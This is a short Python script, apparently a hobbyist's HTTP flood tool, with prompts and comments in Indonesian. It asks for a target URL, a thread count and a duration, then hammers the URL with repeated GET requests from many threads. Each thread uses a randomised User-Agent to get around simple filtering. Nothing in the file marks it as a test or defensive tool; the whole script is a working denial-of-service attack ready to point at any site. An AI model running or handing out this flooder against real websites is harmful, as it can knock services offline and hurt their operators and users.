import requests
import threading
import time
from fake_useragent import UserAgent

print("CODE BY @laxy4us")

url = input("Masukkan URL: ")
num_threads = int(input("Masukkan jumlah thread awal: "))
interval = int(input("Masukkan interval pengiriman thread (detik): "))


count = 0

def send_request():
    global count
    user_agent = user_agent_rotator.random
    headers = {'User-Agent': user_agent}

    while not stop_threads.is_set():
        try:
            response = session.get(url, headers=headers, timeout=1)
            count += 1
            print(f'Response {count}: {response.status_code} - User-Agent: {user_agent}')
        except requests.exceptions.Timeout:
            print("Request timeout")
        except requests.exceptions.ConnectionError as e:
            print(f"Connection error: {e}")

# Buat objek session
session = requests.Session()

# Buat objek UserAgent untuk mengelola User-Agent
user_agent_rotator = UserAgent()

# Buat thread sebanyak num_threads untuk mengirimkan request GET
threads = []
stop_threads = threading.Event()

for i in range(num_threads):
    t = threading.Thread(target=send_request)
    t.start()
    threads.append(t)

# Tunggu selama interval detik
time.sleep(interval)

# Hentikan semua thread
stop_threads.set()
for t in threads:
    t.join()

# Tutup sesi setelah semua thread selesai
session.close()
